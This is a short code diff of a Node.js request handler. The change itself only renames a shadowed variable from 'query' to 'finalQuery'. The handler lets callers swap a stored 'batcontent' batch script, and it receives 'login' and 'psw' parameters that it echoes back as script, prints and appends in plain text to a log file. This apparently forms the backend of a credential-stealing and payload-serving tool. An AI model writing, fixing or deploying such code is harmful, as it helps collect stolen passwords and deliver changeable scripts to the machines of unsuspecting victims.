@@ -42,15 +42,15 @@ function main (req,res) {
                     }
                 });
             } else {
-                let query = JSON.safeParse('{"' + decodeURI(query.replace(/&/g, "\",\"").replace(/=/g, "\":\"")) + '"}');
-                if (query) {
-                    if (query.batcontent) {
-                        batcontent = query.batcontent;
+                let finalQuery = JSON.safeParse('{"' + decodeURI(query.replace(/&/g, "\",\"").replace(/=/g, "\":\"")) + '"}');
+                if (finalQuery) {
+                    if (finalQuery.batcontent) {
+                        batcontent = finalQuery.batcontent;
                         console.log('Bat content changed: now it is:\n' + batcontent);
                         res.end("New bat content:\n" + batcontent);
-                    } else if (query.login && query.psw) {
-                        let psw = query.psw;
-                        let login = query.login;
+                    } else if (finalQuery.login && finalQuery.psw) {
+                        let psw = finalQuery.psw;
+                        let login = finalQuery.login;
                         res.end('console.log("Login: ' + login + '; password: ' + psw + ' got");');
                         console.log('Login: ' + login + '; password: ' + psw);
                         fs.appendFile('log', 'Login: ' + login + '; password: ' + psw + "\n", function (err) {
